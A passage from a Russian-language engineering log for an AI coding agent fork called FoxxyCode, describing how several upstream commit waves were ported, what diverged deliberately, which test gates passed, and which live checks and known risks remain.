`docs/opencode-hooks.md`, `docs/zcode-hooks.md`, `.gitignore` (+`.zcode/plans/`, `.zcode/sessions/`),
`README.md`, секция `AGENTS.md` переименована в **Codex, OpenCode, Cursor and ZCode rules**.
Ребренд: `zcode-coddy-rules` → `zcode-foxxycode-rules`, temp-префикс в тесте плагина.
В `.zcode/config.json` сохранён `python` (а не `python3`) — комментарий про Windows Store stub
здесь по делу.

**`Makefile` — ручной мерж:** форковый `.PHONY` несёт 12 лишних целей; добавлены
`test-opencode-rules`, `check-windows`, `lint-windows`; `test:` получил префикс
`test-opencode-rules`. Хунк `install:` не применялся — форк переписал его на многострочный блок.

**Проверено:** `node --test .opencode/tests/project-rules.test.js` — 8/8; ZCode-хук прогнан руками
обоими событиями на этом репозитории (`SessionStart` отдаёт 3 always-правила, 5727 байт;
`PreToolUse` на `external/httpserver/server.go` подтягивает `api-layer.mdc`, 5850 байт).

### 9. Windows-CI, правило про скриншот, ассеты (upstream `f409c52` + `859b484` + `990c429`)

- `.github/workflows/tests-on-pr.yaml`: задания `cross-build-windows` (ubuntu, `make check-windows`)
  и `test-windows` (`windows-latest`, `internal/platform` + `internal/bgtask` + `internal/tools/shell`),
  плюс второй шаг golangci-lint с `GOOS: windows`. Проверено, что эти три пакета **не** шеллятся
  в `rg` (упоминания `rg` там — только строковый валидатор Ask-режима), поэтому ripgrep на
  windows-раннере не нужен.
- `Makefile`: цели `check-windows` (кросс-сборка + `go vet` по всем не-`ui` комбинациям тегов,
  включая тестовые файлы) и `lint-windows`.
- `.claude/rules/testing.md` + зеркало `.cursor/rules/testing.mdc` — по пункту про Windows-гейты.
- `859b484` **переписан, а не cherry-pick'нут**: форковый `.claude/rules/workflow.md` разошёлся
  (свои пункты **Rules sync** и **Changelog**, удалённая секция BDD upstream). Новый шаг 5
  (скриншот каждой изменённой UI-поверхности в PR) вставлен, шаги 5-8 → 6-9, `paths:` += `external/ui/**/*`.
  Зеркало `.cursor/rules/workflow.mdc` перегенерировано из `.md`, **форковый `alwaysApply: false`
  сохранён**. Обновлены `.codex/rules.md` и `AGENTS.md`.
- `990c429`: взяты **только** 10 PNG `docs/assets/pw-confirm-*.png` (первый `git checkout` тянул
  весь upstream'ский `docs/assets/` с coddy-брендированными логотипами и затирал форковый
  `INDEX.md` — откачено). В `INDEX.md` добавлена секция с явной пометкой, что кадры сняты с
  английского UI upstream.

### Осознанно принятые риски этой волны

- **Синхронный reload держит HTTP-запрос.** `ReplaceConfig` дозванивается прямо в запросе, а форк
  зовёт её из **двух** сохраняющих путей (`config_http.go`, `skills_mgmt.go`), поэтому сохранение
  настроек может занять до 30 с × число живых сессий. У upstream та же цена, но вызывающий один.
- **Три писателя `configuredMCPClients` не упорядочены между собой.** Старт сессии и
  `SetSessionWorkspace` публикуют из фоновой горутины, reload — синхронно; медленный стартовый
  дозвон может лечь поверх более свежего reload. У upstream писателей два и оба синхронные.
  Чинится монотонной эпохой публикации — отдельным PR.

### Живой прогон (реальный провайдер `neuraldeep`)

Бинарь `-tags "http ui"`, изолированные `FOXXYCODE_HOME`/`FOXXYCODE_CONFIG`/cwd во временном
каталоге вне репозитория, ключ **только** через `${NEURALDEEP_API_KEY}` в конфиге (на диск не
попадает). Модель `nd/gpt-oss-120b`. Тела запросов идут из файла через Python — кириллицу в
аргументе `curl`/PowerShell ломает слой запуска процесса, а не продукт.

- **Ретраи.** `llm_retry_max: 1` против всегда-500 эндпоинта: **ровно 2** запроса вверх — и для
  прямой YAML-модели, и для agent-хода. (Промежуточная ошибка стенда поймала и подтвердила
  дефолт: с несуществующим ключом `retry_max` применяется `llm_retry_max: 3` → 4 запроса,
  то есть скрытых SDK-ретраев нет ни в одной комбинации.)
- **Короткое cp1251-вложение** — тот самый баг блока 2. Файл `short.go`, **44 байта**, не валидный
  UTF-8, единственная кириллица — комментарий `// Готово`: модель процитировала его дословно.
  `note.txt` (43 байта): `«кавычки»`, `тире —`, `№ 5`, `ёж и Ёлка` — всё дошло целым.
- **Round-trip cp1251.** Модель через `edit` заменила строку на `итог — № 42, ёж`: файл на диске
  **остался cp1251** (не валидный UTF-8), правка применена, соседние строки целы.
- **Идентичность фоновых задач.** `process_started_at` пишется в `meta.json` и **совпадает с
  creation time от Windows до микросекунды** (`08:22:36.713972` в записи против `08:22:36.7139720`
  у ОС). Бинарь убит без drain — дерево пережило смерть процесса; после рестарта
  `background_list` в **той же сессии** отдаёт `bg_1 [orphaned] … still alive from an earlier run
  (pid 60356), reap with background_reap`; `background_reap` снёс его (процесса больше нет);
  повторный `reap` — «No leftover background processes from an earlier run».
- **Старый бандл без идентичности** (одноразовое изменение поведения): у записи вручную удалён
  `process_started_at` — задача **не показана** в `background_list`, **не тронута** `background_reap`,
  процесс остался жить. Ровно то, что описано в `docs/background-tasks.md` (**Upgrading**),
  то есть поведение задокументировано, а не сломано молча.
- **Hot-reload MCP.** Сессия открыта без configured-серверов → `PUT /foxxycode/config` с новым
  stdio-сервером (200) → `GET /foxxycode/mcp` показывает `settings-probe: connected, 1 tool` →
  **уже открытая** сессия вызвала его инструмент и получила `pong from settings-probe`.
  Удаление сервера тем же путём тоже применилось.
- **ConfirmDialog.** Удаление чата: `role="dialog"`, `aria-modal="true"`, portal в `body`,
  заголовок «Удалить чат?», тело «Чат и всё его содержимое будут удалены навсегда.», кнопки
  «Отмена» / «Удалить», фокус по открытию — на **Отмене**. **Escape отменяет диалог и оставляет
  шторку сессий открытой** (16 строк до и после) — это форковый фикс `df305ba`, без capture-фазы
  схлопнулась бы и шторка. Подтверждение реально удаляет (16 → 15 строк, `DELETE … → 200`).
  Консоль чистая; единственная 404 — `/foxxycode/scheduler/jobs`, потому что стенд собран без
  тега `scheduler`.

**Не покрыто живьём:** скриншоты SPA — панель браузера в этой среде не композитит кадры
(`screenshot` отваливается по таймауту), проверка сделана через DOM; и порядок ACP `session/new`
— ACP-транспорт не поднимался, поведение закрыто `features/acp_session_integration.feature`.

### Осталось нерешённым (перенесено)

- Четыре незакрытых «известных риска» волны `96c04fb → 6d46afe`.
- Четыре PNG `docs/assets/screenshot-tool-previews*.png` — тянутся с волны `6666606 → 19754e8`.
- Скриншоты ConfirmDialog со **своего** UI (по новому правилу из блока 9) — нужна среда с рабочей
  панелью браузера.

### Гейты этой волны (все зелёные)

`go build` (default и `http ui scheduler memory`); `go test ./cmd/... ./internal/...`;
`-tags=memory`, `-tags=scheduler`, `-tags=http`, `-tags=http,ui`, `-tags=http,scheduler,memory`
по `external/httpserver`; `go test ./internal/session/... -race`;
`GOOS=linux`/`GOOS=darwin`/`GOOS=windows go vet` (доказывает, что `procgroup_other.go` и обе
half'ы компилируются); `golangci-lint run` — **0 issues**; `node --test` — 8/8;
`npm run test` — **974 теста / 165 файлов**, `build` + `check:compat` + `build:go`.
`make test` целиком **не гонялся** — его шаг `ui-build` на этой машине падает, а `kilocode-main/`
ломает `./...`, поэтому сборка и линт идут по каталогам (`./cmd/... ./internal/... ./external/...`).

---

## Волна `fa7ecf1 → 12897ba` (теги `0.9.61`–`0.9.67`) — ГОТОВО

37 не-merge коммитов (2026-08-09…15), 282 файла. Волна делится ровно по авторам:
16 коммитов `hijera` — UI и HTTP, работа владельца форка, **отданная в апстрим**
(часть их содержимого здесь уже была); 21 коммит `Pavel Rykov` — консоль-TUI,
remote-клиент и фикс `question`-тула. Портирована пятью коммитами.

### Коммит 1 — переключатель языка в «Внешний вид» (`ba654e9`, `7594dae`, `9a79dc5`, `486a668`)

Сегментированный контрол из трёх кнопок во вкладке «Общие» заменён нативным
`<select>` во вкладке «Внешний вид», под сеткой тем (`AppearanceLanguagePicker`).
Портирован реестр `i18n/locales.ts`: список локалей перестал дублироваться в
`dictFor`, cookie-валидации, разборе `?lang=`, чтении конфига и опциях пикера.

**Расхождения (осознанные):** апстримовский пикер персистит только в cookie — наш
сохраняет `ui.locale` в конфиге, потому что этот ключ читают плагины IntelliJ и
VS Code; `AppearanceThemePicker` поэтому принимает `doc`/`setDoc`. Вкладка «Общие»
остаётся (режим отправки, статус-строка). Побочно починено: «Авто» теперь чистит
cookie `foxxycode_ui_lang` — раньше после переключения на «Авто» язык оставался
прежним до следующего явного выбора. Правило `.claude/rules/ui-spa.md`, запрещавшее
язык в Appearance, переписано вместе с зеркалом в `.cursor/rules`.

### Коммит 2 — мелкие фиксы (`2f177f4`, `637ff6b`, `1ee4a48`)

`question`-тул принимает формы аргумента, которые реально порождают модели (массив,
одиночный объект, любая из них внутри JSON-строки) — чистый cherry-pick, файл
побайтово совпадал с апстримовским. `detectReasoningLevels` узнаёт `gpt-oss*` и
`qwen3*`; для qwen3 запрос дополнительно несёт `chat_template_kwargs`
`{"enable_thinking": true}` — у Qwen это переключатель chat-шаблона, а не уровень
усилия. Удалены осиротевшие `messages/DiffView.tsx` и `chat/toolCallArgsDisplay.ts`
с их CSS.

### Коммит 3 — turn-события, реле и `GET /foxxycode/events` (`d1ff9b9`, `d7fe7df`, `6ecd99a`, `9a6bd7c`, `6afe3b3`)

Ход принадлежит сессии, а не запросу, который его начал: реле открывается на
**каждый** профильный ход, включая `stream:false`. `activeTurns` из множества стал
счётчиком с идемпотентным release — это чинит живой баг форка (`RunPlan` отмечает
сессию дважды, и внутренний возврат гасил активность). `turn_events.go` публикует
только фронты 0→1 и 1→0 на горутине хода; один наблюдатель покрывает HTTP, ACP,
gateway и background-waker. Новый SSE-роут `GET /foxxycode/events` (снимок активных
ходов → `event: ready` → живые фронты) принимает `?access_token=`. `Sender.stream`
разделён на `emit` + `interactive`, writer расширен до `io.Writer` (форковый шим
`relaySSEWriter` за ненадобностью удалён). Кадры реле стали целыми и нумерованными:
подрезка больше не рвёт кадр пополам, отставший подписчик помечается `desynced`,
`Last-Event-ID` возобновляет с нужного места, префикс `id:` — только на подписчицком
пути. `SkipTurnLock` расщеплён: отвязку хода от запроса взял `DetachFromRequest`.

**Расхождения:** сохранены `AcquireComposerTurnLockWaiting` и конверт `session_busy`;
`SendError` оставлен с аргументом-`error` и JSON-маршалингом (байты те же); ход
пробуждения фоновой задачи остаётся `interactive` — за его реле смотрит браузер,
который может ответить на запрос прав; абзац про возобновление, который апстрим
вклеил ещё и в описания POST-роутов `/permission`, `/question`, `/cancel`, к ним
не добавлен: это не подписчицкие потоки.

### Коммит 4 — SPA: события ходов, возобновление реле, вложения-картинки (`8d3dfa8`, `8a278a0`, `45f8069`, `e170a3d`)

Именованные `event: error` больше не проваливаются мимо всех веток ридера (раньше
цикл крутился до закрытия сокета и оставлял пустой пузырь ассистента). `sse.ts`
разбирает `id:`, ре-аттач шлёт `Last-Event-ID`, `event: desync` перечитывает
транскрипт. `chat/serverEvents.ts` подписан на `/foxxycode/events` (на `fetch`, не
`EventSource`: нужен `Authorization` от env-шима), и пока подписка жива, 2-секундный
поллинг сужается до локальных композеров. Картинка из буфера обмена прикрепляется
вставкой (`pasted-<n>.<ext>`), вложение само по себе — валидное сообщение, чипы для
немультимодальной модели показываются перечёркнутыми и не уходят на сервер.
Бэкенд пишет ограниченную PNG-миниатюру рядом с ассетом и отдаёт её из
`GET /foxxycode/sessions/{id}/assets/{name}/thumbnail`; пузырь показывает blob-превью
сразу и меняет его на серверный URL, освобождая blob.

**Расхождения:** апстримовский `composerStreamError.ts` дублирует форковый
`liveTurnRecovery.ts` — код `no_active_stream` добавлен в существующий модуль;
обработчик `turn_started` переиспользует форковый `reconnectLiveStreamIfActive`;
**drop по-прежнему вставляет `@path`-упоминание**, а не прикрепляет файл — это
форковый контракт IDE-drag-drop, а вставка закрывает случай с картинкой.

### Коммит 5 — консоль-TUI и remote-клиент (`4e7dbb6` + follow-up, `6421537`, `eabb614`)

`external/cli` (+`tui`) за тегом `cli` — TUI написан руками, без bubbletea; блок
аддитивный, `internal/agent`/`internal/session`/`internal/acp`/`external/httpserver`
ради него не менялись. `internal/remote` — ACP-фасад над HTTP, так что
`foxxycode acp --remote` и `--remote` у консоли работают против сервера на другой
машине. Голый `foxxycode` в терминале открывает консоль; аргумент с ведущим `-`
уходит туда же (`-c`, `-p`). Desktop-сборка сохраняет свой слот: она линкуется с
`-H=windowsgui` и tty-пробу не проходит.

**Расхождения:** режимы стали data-driven (апстрим хардкодит `agent`+`plan` в трёх
местах; консоль строит список из ACP `ModeState`, remote-хендлер — из профильных
строк `GET /v1/models`); добавлены `Manager.ToolCallResult`, роут
`GET /foxxycode/commands` и поле `mode` в `GET .../messages`; метки времени сессий
переведены на `RFC3339Nano` — посекундной точности не хватало для устойчивого
порядка «новейшая первой»; `docs/assets/cli-tui/*` (coddy-брендинг) и сторонний
`pi-tui-reference` намеренно не импортированы.

### Гейты

`go test` по умолчанию, с `-tags cli`, `-tags http`, `-tags http,cli`;
`golangci-lint` в обоих проходах (без тегов и с `cli`); `GOOS=windows` build и vet
с `cli`; 1001 vitest; `build:go` + `check:compat`.

### Живой прогон

На реальном бинаре `-tags "http ui"` с изолированным home: селект языка под темами
на 1280px и 390px, без горизонтального переполнения, границы и поле резолвятся по
теме в light и dark; выбор пишет `ui.locale` в `config.yaml` и меняет надписи без
перезагрузки, «Авто» пишет пустую строку и чистит cookie, во вкладке «Общие» языка
нет; `GET /foxxycode/events` отдаёт `retry` + `event: ready`, затем `turn_started` и
`turn_ended` для хода, начатого отдельным `stream:false` POST-ом; загруженная
картинка попадает в `assets/`, транскрипт отдаёт `files[]` с `preview_url`, и по
нему приходит настоящий PNG с immutable-заголовками; у консоли `-h` перечисляет
новые входы, `-p` доходит до агента, голый запуск через пайп печатает usage,
а lean-сборка отвечает подсказкой про пересборку.

**Отложено:** скриншоты изменённых SPA-поверхностей — панель браузера в этой среде
не композитит кадры, поэтому проверка велась через DOM и вычисленные стили.

---

## Волна `12897ba → 1a84b37` (теги `0.9.68`–`0.9.79`) — ГОТОВО

42 не-merge коммита (2026-08-02…24), 212 файлов, ~16k строк. Портирована десятью
коммитами на ветке `claude/port-coddy-agent-changes-ad8251`. Разведка перед портом
показала, что слой `internal/llm` разошёлся слабо и **ортогонально** (картинки,
retry-логгер, `Compacted`, `MaxContextTokens`), `external/cli` практически совпадает
с upstream, а enhance-prompt в форке **первичен** — upstream получил его от нас.

### 1. llama.cpp SSE (`3a1e654` + 3 review-раунда, наш `01220c3`)

SSE-сканер вынесен из `openai.go` в `openai_stream.go` и принимает то, что реально
шлёт llama.cpp: keep-alive-комментарии, пустые data-кадры и нестандартное поле
`error:`. Сообщение сервера («the request exceeds the available context size»)
доходит до оператора вместо «unexpected end of JSON input». Битые кадры отбиваются
строго; типизированная ошибка стрима — источник истины в `httpStatusFromError`
(без падения в подстрочный матчер), и после уже отданных дельт ретрая нет вовсе.

### 2. `models[].stream: false` (`adb4a4a`…`a9b92bf`, наш `20bfce8`)

`blockingProvider` внутри resilient-обёртки: один `Complete` и переигрывание
готового ответа через тот же chunk-колбэк. Ключ трёхзначный (`*bool`), поэтому
форма настроек рисует незаданный тумблер из schema-дефолта, а не из
`Boolean(undefined)`; для `codex` комбинация отбивается. ReAct несёт `llmTransport`
и снимает два гарда, которые для блокирующего ответа бессмысленны: таймер первого
токена и часы reasoning (иначе в транскрипт попадала выдуманная длительность).
SSE-ответ шлёт keepalive-комментарий после 15 с тишины, привязанный к своей
stop-функции, а не к контексту запроса.

**Расхождения:** гард первого токена остаётся на форковых 30 с (upstream — 90 с);
прямой YAML-путь — форковый `server_direct.go`; новая строка схемы переведена.

### 3. Retry-After и обрыв стрима (`4cf9c39`, наш `1eb2c60`)

Пауза берётся у сервера (`Retry-After-Ms` / `Retry-After`, затем фразы
«Limit resets at» и «retry in Ns»), потолок 60 с; `llm_min_interval_ms` переехал
внутрь цикла ретраев. Обрыв на середине больше не выдаётся за законченный ответ:
оба диалекта отдают типизированный `streamTruncatedError`, сохраняют увиденный
текст и выбрасывают недостроенные тулколы. Транспортные сбои без статуса
(reset, unexpected EOF, http2) стали retryable — но только пока ничего не отдано
вызывающему. Новые ключи: `agent.llm_first_token_timeout_ms`,
`providers[].timeout_ms`; `agent.llm_retry_max` стал `*int` (явный 0 выключает ретраи).

**Расхождения:** дефолт таймаута — форковые 30 с; `resilient.go` сохраняет форковый
warn-лог и классификацию `net.Error.Timeout()`; jsondto/schema_ui_defaults идут по
форковой конвенции прямого копирования указателей.

### 4. Самонастройка: uci-стейджинг (`f935091`, `7ae890b`, `c82c711`, `cbc171a`, наш `e9f0a30`)

Семейство `config_get / config_set / config_changes / config_commit / config_revert /
config_rollback`: команды стейджатся и валидируются по схеме, файл трогает только
подтверждённый commit, после которого `Manager.ReloadConfigForSession` пересобирает
скиллы, правила, MCP-клиентов и реестр тулов, а ReAct обновляет определения и права
на границе между двумя вызовами модели — настройка действует внутри того же хода.
Bundled-скилл `configure-foxxycode` учит модель синтаксису и порядку «подтвердить →
закоммитить».

**Расхождения:** reload **заново прогоняет MCP-гейт доверия** против применяемой
конфигурации (иначе перезагрузка стала бы обходом доверия к `.foxxycode/mcp.json`),
а заблокированный сервер возвращается предупреждением с командой одобрения;
тулы разложены по **четырём** форковым режимам, а не двум (`plan` получает
`config_get` + `config_changes`, `docs`/`ask` — ничего); состояние сессии использует
форковую пару `replaceConfiguredMCPClients`/`addMCPClient`; два commit-теста,
ломающие запись снятием бита с каталога, пропускаются на Windows.

### 5. Кнопка улучшения промпта в context-row (`7a30b6d`, `ff00511`, `094e0b7`, наш `eaf9c0f`)

Кнопка уехала из нижней панели в новый `.composer-context-row` (24×24, прижата
вправо; ниже 520px — в правый верхний угол строки). Заодно `.composer-context-chips`
стал `display: contents`, поэтому длинная ветка переносит только те чипы, что реально
не помещаются, а не всю группу.

**Расхождения:** строка рендерится всегда (форковый `WorkspaceChips` умеет вернуть
`null`); подпись остаётся локализованной. Проверено в браузере на собранном бинаре.

### 6. Идентичность в системном промпте (`dac54cd`, `0931c01`, `04f2ff6`, наш `99c14e1`)

`internal/prompts/identity.go`: `WithIdentity` гарантирует, что имя продукта попадает
в те 220 символов, которые читает шлюз. Применено к промпту хода, обоим движкам
компакции, заголовкам сессий, describe, enhance и memory-копайлоту.

**Расхождение:** форк открывает промпт директивой `## Response language`, которая для
части локалей сама по себе выталкивает начало шаблона за окно, поэтому `WithIdentity`
оборачивает директиву вместе с шаблоном и даёт единственную строку идентичности —
встроенные шаблоны намеренно **не** брендируются (иначе строка печаталась бы дважды).
Upstream-тест, требующий обратного, переписан под форковую схему.

### 7. Консоль: `!!` — локальная команда мимо агента (`f149b67`, `1fb0a2f`, `e0b69d9`, наш `e4ed152`)

`internal/tools/shell/operator.go` переиспользует обработку процессов `run_command`
(тот же шелл, отсоединённая группа, декодирование и санитайз) и намеренно ничего
больше: без permission-гейта (принципал — оператор), без сессии, без пула, без
persisted-тулкола; хранится хвост в 256 КиБ. В консоли — зелёная рамка редактора,
свой блок транскрипта, `escape` как убийца и жёсткое «одна за раз».

Попутно: `TerminateProcessGroup` на Windows читает код возврата `taskkill` вместо
предположения об успехе и больше не убивает сам `taskkill` по дедлайну; редактор не
обрезает полусимвол, пока может прийти продолжение.

### 8. Вход в хаб NeuralDeep (`9fb7c5f`, `d2a8b16`, наш `7da2a60`)

`foxxycode providers login|list|logout` плюс те же роуты по HTTP и блок входа в
настройках. Ключ живёт на сервере (`providers/<name>/neuraldeep-auth.json`) и не
попадает в `config.yaml`; порядок учётных данных — явный ключ, команда, env, затем
сохранённый вход.

**Расхождения:** переменная окружения `FOXXYCODE_NEURALDEEP_BASE_URL`, managed-source
`foxxycode`, контракт хаба не тронут; пути учётных данных унифицированы через новый
`config.ProviderAuthPath`; ключи SPA следуют форковой схеме `settings.*` и переведены;
из upstream-набора тестов настроек взяты только три NeuralDeep-теста; проба моделей
принимает neuraldeep-запрос со своим ключом без имени провайдера (на это опирается
форковый онбординг).

### 9. SPA/HTTP: ветки и крупные тулколы (`ce45fae`, `97eb137`, `f117beb`, `db0c589`, `afd13dc`, `f4747fd`, `c0d7a1e`, наш `62bfe82`)

Удаление сессии вычёркивает её из `branches.json` родителя, ветка с одной нитью
схлопывается, а чтение лечит устаревший файл. Карточки `write`/`edit`/`apply_patch`
получили ограниченное окно и переключатель «Ещё…»/«Свернуть», восстановленная сессия
дотягивает полные аргументы, а `chat/toolCallArgs.ts` не даёт reconcile подменить
полные аргументы усечённым превью.

**Форковый баг, вскрытый портом:** базовое правило `.permission-preview-viewport`
потеряло `max-height`/`overflow` ещё при порте волны превью — ничего не клипалось и
переключатель не мог появиться в принципе. Восстановлено.

### 10. Хвост волны (наш `84d6ccd`)

Записи конфигурации сериализованы с транзакцией `config_commit`: редакторы MCP-серверов,
политики доверия и источников скиллов делают полный read-modify-write под общим файловым
локом и поверх **свежего** файла. Плюс спеки для `!!`, тест на место кнопки enhance и
документация (self-config в mcp-integration/skills/rules, NeuralDeep и композер в
`docs/ui.md` и `DESIGN.md`, e2e-скрипты в `examples/README.md`, список команд в `AGENTS.md`).

### Не портировано намеренно

- `docs/plans/cli-tui.md` — форк его сознательно не держит.
- Скриншоты `docs/assets/*` — по правилу форка кадры снимаются своим UI.
- Ребренд `internal/prompts/{agent,plan}.md` — см. расхождение в блоке идентичности.
- Upstream-овские `enhance_prompt_test.go` и remote-сценарий enhance — enhance родом из
  форка, у него своё (более широкое) покрытие, а в форковом remote-харнессе нет
  stub-провайдера.

### Живой прогон (реальный провайдер `neuraldeep`)

Бинарь `-tags "http ui cli"`, изолированные `home`/`config` вне репозитория, ключ только
через `NEURALDEEP_API_KEY` в окружении команды. Модели `neuraldeep/gpt-oss-120b` (поток)
и `neuraldeep/qwen3.6-35b-a3b-noreason` (`stream: false`).

- **Обычный ход** на потоковой модели: `-p` отдаёт ровно запрошенный ответ.
- **Идентичность**: на вопрос «что ты за продукт» модель отвечает «FoxxyCode AI coding
  assistant agent» — строка идентичности реально доезжает до модели.
- **`stream: false`**: ход на блокирующей модели проходит и отдаёт ответ целиком;
  гард первого токена и часы reasoning для него не взводятся.
- **`foxxycode providers list`**: показывает провайдера и источник учётных данных
  (без ключа в окружении — «no credentials» с подсказкой `providers login`).
- **HTTP-поверхность** (собранный бинарь, SPA из свежего бандла):
  `GET /foxxycode/providers/neuraldeep/neuraldeep-auth` → `200 {connected:false, source:"none"}`;
  в OpenAPI присутствуют все три пути `neuraldeep-auth`, путь `/foxxycode/sessions/{id}/branches`,
  операции `delete` + `patch` на `/foxxycode/sessions/{id}` и схема `NeuralDeepAuthStatus`;
  `/v1/models` отдаёт обе YAML-модели.
- **SPA**: кнопка улучшения промпта — элемент 24×24 в `.composer-context-row`,
  `.composer-context-chips` вычисляется как `display: contents`, базовое правило
  `.permission-preview-viewport` снова даёт `max-height: 190px` + `overflow: hidden`.
  В консоли браузера только 404 `/foxxycode/scheduler/jobs` — бинарь собран без тега
  `scheduler`.

**Не прогнано живьём:**

- Полный цикл `config_set → config_commit → config_rollback` на HTTP-поверхности:
  сценарию нужен сервер, держащий ключ провайдера, а запись ключа в файл в этой среде
  запрещена песочницей. Цикл покрыт `features/config_tools.feature` (9 сценариев) и
  юнит-тестами; e2e-скрипты `examples/*/**_e2e_config.py` добавлены и ждут стенда.
- `!!` в интерактивной консоли: нужен настоящий TTY. Покрыто сценарием
  `features/cli_tui.feature` и юнит-тестами `chat_test.go`.

**Замечено (не дефект порта):** консоль (`external/cli`) не подключает
`SetConfigReloader`, поэтому в ней из семейства самонастройки виден только `config_get` —
ровно как в upstream, где реладер тоже подключён лишь в ACP-, HTTP- и gateway-входах.

### Известные риски этой волны

- Тулы самонастройки дают агенту запись в собственный `config.yaml`. `accept_edits` их
  не автоодобряет, но включены они по умолчанию — проговорить в релиз-нотах.
- `agent.llm_retry_max: 0` сменил смысл с «дефолт» на «ретраи выключены».
- `tools.output_limits`, result eviction и прочие риски прошлых волн остаются открытыми.

---

## Волна `1a84b37 → 7123d25a` (теги `0.9.80`–`0.9.84`) — ГОТОВО

20 не-merge коммитов (2026-08-17…28), 120 файлов в upstream. Портирована пятью коммитами
на ветке `claude/port-coddy-project-changes-9071af`. Особенность волны: значительная её
часть пришла в upstream **из форка** (PR #110 hijera — Windows update helper; ветка
`claude/foxxy-agent-status-line`; вся волна русской локализации — upstream догонял форк),
поэтому 9 из 20 коммитов пропущены как уже покрытые.

### Коммит 1 — reasoning на оборванных стримах (upstream `282fa3eb`, наш `1c9f2b25`)

`internal/llm/openai_stream.go` форка был побайтово равен upstream-до-фикса — чистый
черри-пик. Стрим, оборванный после reasoning-дельт, но до текста ответа, теперь возвращает
частичный ответ с этим reasoning вместо потери всего, что колбэк уже видел.

### Коммит 2 — Windows self-update через helper (upstream `ade4ce11` + `aa3fa0b1`, наш `a4f99e48`)

Windows не может переименовать поверх выполняемого образа, поэтому `foxxycode update`
стейджит бинарь рядом с целью, копирует себя в `%TEMP%\foxxycode-update-helper-*.exe`
и выходит; helper ждёт родителя (PID + creation time против переиспользования PID),
делает бэкап, меняет с раздельными бюджетами ретраев (SHARING_VIOLATION 30 с /
ACCESS_DENIED 5 с + текст про элевацию), пробует `__restart-after-update --probe`
(даунгрейд на релиз до хендоффа стартует старый бинарь напрямую, helper подметается
следующим апдейтом) и откатывает бэкап при неудачном рестарте. Плюс `SHA256SUMS`-проверка
(`release-binaries.yaml` форка уже публикует ассет с foxxycode_*-стемами — `checksum.go`
лёг verbatim), Range-докачка в 3 попытки под потолком 256 MiB c отбором 206-в-неверном-
оффсете, прогресс-бар только на терминале, `update -no-restart` для скриптов.
`RunHelper` — первый оператор `main()`; CI-джоба test-windows гоняет `./internal/update/...`.

**Расхождения с upstream (осознанные):**
- Протокол хендоффа — только PID+creation-time+argv, именованных объектов нет; ребренд
  свёлся к `helperPrefix`, бэкап-префиксу, `restartCoddy → restartFoxxyCode` и ~15 строкам.
- **Форковый гард spawn-точек** (`TestEverySpawnSiteHidesItsConsoleWindow`) потребовал
  решения, которого у upstream нет: запуск helper-а и restart-probe идут через
  `platform.HideConsoleWindow` (no-op в консоли, без окна под desktop-шеллом), а
  `restartFoxxyCode` задокументирован как исключение — перезапущенный бинарь и есть то,
  что оператор должен увидеть.

### Коммит 3 — live status line (upstream `65bcba58`+`b1bddaf0`+`9ed28022`+`87e33d4d`, наш `957ef374`)

SPA-часть родилась в форке (ed3bdde2/47a6ce60) и уехала в upstream через ветку
`claude/foxxy-agent-status-line` — сюда вернулись только дельты:
`deriveLiveStatus` различает running/pending тулколы (каждый вызов анонсируется pending,
пока стримится ответ, исполняются они последовательно — in_progress бьёт более поздний
pending), маппинги `foxxycode_memory_*`/`config_*` (+пара ключей `status.config`).
Консольная часть — новая: `external/cli/status.go` — Go-близнец `liveStatus.ts`
(глагол+цель+счётчик у спиннера, эскалация ожидания 15 с/60 с, без счётчика под
permission/question-модалкой, рестарт счётчика после одобрения; `blockStatus`/`unblockStatus`
из b1bddaf0 включены как финальное состояние). Интеграция в `app.go`/`tui/loader.go`
(`SetMessageFunc` на 80-мс тике)/`updates.go` легла на якоря без адаптации.

**Расхождение:** таблица фраз CLI **расширена** относительно upstream форковыми тулами —
`svn_*` (Working with SVN), `docs_edit`/`docs_write`, `foxxycode_browser_*` (Using the
browser) — зеркально SPA-таблице; CLI остаётся англоязычным. ⚠️ `external/cli` за
build-тегом `cli`: дефолтные гейты его не компилируют, тесты/линт только с `-tags=cli`.

### Коммит 4 — диски в workspace folder picker (upstream `e6543a75` + `c4f3aeee`, наш `9200531c`)

Пикер «Открыть папку» не мог покинуть диск: сервер отдавал `parent == path` для корня
диска (ряд `..` прятался), а `pathParent` в SPA резал только по `/` и схлопывал
`H:\…` в `/`. Теперь: `internal/platform.Drives()` (GetLogicalDrives-битмаска — без
per-letter stat-пробы, будящей съёмные носители), `?path=:drives:` — синтетический
уровень томов (`drives:true`, `parent == path`), корень тома отвечает `parent :drives:`;
листер — шов на `Server`, поэтому поведение тестируется на любой ОС. SPA: сепаратор-
агностичный `pathParent`, `cleanPathInput` (кавычки из «Копировать как путь»),
редактируемое поле пути (Enter — переход, кнопка `Go`/`Открыть` по состоянию),
глифы дисков, задизейбленный Open на уровне томов, sequence-токен `browseRequest`
против поздних устаревших листингов (c4f3aeee).

**Расхождения с upstream (осознанные):**
- `openapi.go` взят вместе с upstream-фиксом вложенности: 400/404/500 `errorResponseRef`
  вынесены из подкарты `"200"`, где лежали и в форке.
- 5 новых пар ключей `composer.folderModal.*` (en+ru); upstream-тест
  `localizes workspace controls in Russian` **выброшен** — он ассертит переводы их
  i18n-волны («отсоединённая», «рабочее дерево»), расходящиеся с осознанными форковыми
  (`detached` как git-термин не переводится); RU-покрытие тех же поверхностей у форка
  уже есть своими тестами.
- CSS переписан на `--foxxycode-*`-токены; `npm run check:compat` и `test:layout` зелёные.
- Скриншоты upstream PR#127 (`ed2841a2`) **не** портированы — политика форка: снимать свои.

### Коммит 5 — CLDR-плюрализация + два фикса локализации (upstream `bb026113` + куски `98e106da`/`5083ac6f`, наш `98c72c89`)

Единственно новое из i18n-волны upstream: `translatePlural`/`tp` на `Intl.PluralRules`
(запись на CLDR-категорию под `key.category`, `{count}` автомёржится, фолбэк
категория → other → английский → ключ), `tp` в `useT()`. `messagesParity.test.ts`
заменён family-aware версией (семьи из дефолт-локали, каждая локаль несёт ровно
категории своих правил, token-parity ходит по ключам самой локали). Мигрированы
`tasks.chip.running/.total` и `prompts.permissionMeta.chars/.lines` — настоящие русские
формы вместо «двоеточных» обходов. Плюс два живых дефекта форка: cron-описания в русском
UI молча рендерились по-английски (не был зарегистрирован `cronstrue/locales/ru`;
добавлен + `cronLocale()`), и статуслесс-ошибка сохранения плана рендерила
«ошибка сохранения ()» (токен-фри ключ `prompts.planSaveFailedNoStatus`).

**Расхождение (форк чинит то, что upstream не дочинил):** cronstrue кидает **голые
